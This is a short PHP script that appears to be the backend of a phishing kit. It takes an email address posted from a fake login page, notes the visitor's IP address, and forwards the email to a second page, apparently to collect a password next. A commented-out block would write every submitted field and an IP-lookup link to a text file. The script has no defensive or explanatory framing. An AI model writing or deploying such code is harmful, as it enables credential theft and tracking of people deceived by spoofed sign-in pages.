<?php

$t1=$_POST["email1"];
$null1 = "";
$Datex=date("D d M, Y");
$Ipx = $_SERVER['REMOTE_ADDR']?:($_SERVER['HTTP_X_FORWARDED_FOR']?:$_SERVER['HTTP_CLIENT_IP']);

if ($t1 == $null1) {
			//back to HTML 1
			header('Location: index.html');

	} else {

		// 3ma1l

// HTML 2
header('Location: index2.html?email='.$t1);

/*Text File
$handle = fopen("PasteValues.txt", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "IP: http://www.iplocationtools.com/".$Ipx.".html");
fwrite($handle, "\r\n\n");
fclose($handle);
exit;
*/
}

?>